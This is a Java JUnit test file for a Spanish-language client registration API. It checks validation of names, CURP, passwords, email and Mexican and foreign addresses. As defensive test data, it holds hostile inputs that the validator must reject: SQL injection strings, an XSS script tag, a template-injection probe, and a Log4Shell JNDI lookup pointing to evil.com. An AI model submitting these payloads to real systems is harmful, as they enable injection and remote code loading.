package com.proyecto.servicios.model.cliente;

import com.proyecto.servicios.entity.cliente.EstadoCivil;
import com.proyecto.servicios.entity.cliente.Sexo;
import jakarta.validation.Validation;
import jakarta.validation.Validator;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.math.BigDecimal;
import java.time.LocalDate;

import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.assertFalse;

class ClienteRegistroRequestValidationTest {

    private final Validator validator = Validation.buildDefaultValidatorFactory().getValidator();

    @Test
    void requestValido_pasaTodasLasValidaciones() {
        assertTrue(validator.validate(requestValido()).isEmpty());
    }

    @Test
    void requestInvalido_rechazaTelefonoCodigoPostalCorreoYPassword() {
        ClienteRegistroRequest request = requestValido();
        request.setTelefonoMovil("123");
        request.setCorreo("no-es-correo");
        request.setPassword("debil");
        request.getDireccion().setCodigoPostal("1234");

        assertFalse(validator.validate(request).isEmpty());
    }

    @Test
    void requestInvalido_rechazaDigitoVerificadorCurpIncorrecto() {
        ClienteRegistroRequest request = requestValido();
        request.setCurp("loda900101mdfprn09");

        assertFalse(validator.validate(request).isEmpty());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Abc1!", "abcdef1!", "ABCDEF1!", "Abcdefgh!", "Abcdefg1", "Abcdefg1 "
    })
    void requestInvalido_rechazaPasswordSinRequisito(String password) {
        ClienteRegistroRequest request = requestValido();
        request.setPassword(password);

        assertTrue(validator.validate(request).stream()
                .anyMatch(error -> error.getPropertyPath().toString().equals("password")));
    }

    @Test
    void requestValido_aceptaLetrasUnicodeYCaracterEspecialReal() {
        ClienteRegistroRequest request = requestValido();
        request.setPassword("Ábcdef1!");

        assertFalse(validator.validate(request).stream()
                .anyMatch(error -> error.getPropertyPath().toString().equals("password")));
    }

    @Test
    void requestValido_aceptaDomicilioInternacionalConCodigoPostalAlfanumerico() {
        ClienteRegistroRequest canada = requestValido();
        canada.getDireccion().setPais("Canadá");
        canada.getDireccion().setEstado("Ontario");
        canada.getDireccion().setMunicipio("Toronto");
        canada.getDireccion().setColonia("Downtown");
        canada.getDireccion().setCodigoPostal("M5V 3L9");
        assertTrue(validator.validate(canada).isEmpty());

        ClienteRegistroRequest colombia = requestValido();
        colombia.getDireccion().setPais("Colombia");
        colombia.getDireccion().setEstado("Archipelago of Saint Andréws, Providence and Saint Catalina");
        colombia.getDireccion().setMunicipio("Medellín");
        colombia.getDireccion().setColonia("El Poblado");
        colombia.getDireccion().setCodigoPostal("050021");
        assertTrue(validator.validate(colombia).isEmpty());
    }

    @Test
    void requestInvalido_rechazaCodigoPostalCortoOMaliciosoEnMexicoYExtranjero() {
        ClienteRegistroRequest mexicoCorto = requestValido();
        mexicoCorto.getDireccion().setPais("México");
        mexicoCorto.getDireccion().setCodigoPostal("1234");
        assertFalse(validator.validate(mexicoCorto).isEmpty());

        ClienteRegistroRequest extranjeroMalicioso = requestValido();
        extranjeroMalicioso.getDireccion().setPais("Canadá");
        extranjeroMalicioso.getDireccion().setCodigoPostal("M5V';DROP");
        assertFalse(validator.validate(extranjeroMalicioso).isEmpty());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Reforma' OR '1'='1",
            "Reforma; DROP TABLE usuarios; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "Calle {{7*7}}"
    })
    void requestInvalido_rechazaInyeccionSqlXssOSstiEnDomicilioYDatosLaborales(String payloadMalicioso) {
        ClienteRegistroRequest request = requestValido();
        request.getDireccion().setCalle(payloadMalicioso);
        request.getInformacionLaboral().setEmpresa(payloadMalicioso);

        var errores = validator.validate(request);
        assertFalse(errores.isEmpty());
        assertTrue(errores.stream().anyMatch(e -> e.getPropertyPath().toString().equals("direccion.calle")));
        assertTrue(errores.stream().anyMatch(e -> e.getPropertyPath().toString().equals("informacionLaboral.empresa")));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "\"admin'--\"@example.com",
            "usuario<script>@example.com",
            "admin@example.com;DROP"
    })
    void loginYRegistro_rechazanCorreosConCaracteresDeInyeccion(String correoMalicioso) {
        ClienteRegistroRequest registro = requestValido();
        registro.setCorreo(correoMalicioso);
        assertFalse(validator.validate(registro).isEmpty());

        LoginRequest login = new LoginRequest(correoMalicioso, "Secreta1!", "WEB");
        assertFalse(validator.validate(login).isEmpty());
    }

    private ClienteRegistroRequest requestValido() {
        ClienteRegistroRequest request = new ClienteRegistroRequest();
        request.setNombre("Ana María");
        request.setSegundoNombre("Luisa");
        request.setApellidoPaterno("López");
        request.setApellidoMaterno("Díaz");
        request.setFechaNacimiento(LocalDate.of(1990, 1, 1));
        request.setSexo(Sexo.F);
        request.setEstadoCivil(EstadoCivil.Soltero);
        request.setCurp("loda900101mdfprn05");
        request.setRfc("loda900101abc");
        request.setNacionalidad("Mexicana");
        request.setCorreo("ana@example.com");
        request.setPassword("Secreta1!");
        request.setTelefonoMovil("5512345678");

        DireccionRequest direccion = new DireccionRequest();
        direccion.setCalle("Reforma");
        direccion.setNumeroExterior("100");
        direccion.setColonia("Centro");
        direccion.setMunicipio("Cuauhtémoc");
        direccion.setEstado("Ciudad de México");
        direccion.setCodigoPostal("06000");
        direccion.setPais("México");
        request.setDireccion(direccion);

        InformacionLaboralRequest laboral = new InformacionLaboralRequest();
        laboral.setIngresoMensual(new BigDecimal("25000.00"));
        laboral.setOcupacion("Analista");
        laboral.setEmpresa("Empresa");
        request.setInformacionLaboral(laboral);
        return request;
    }
}
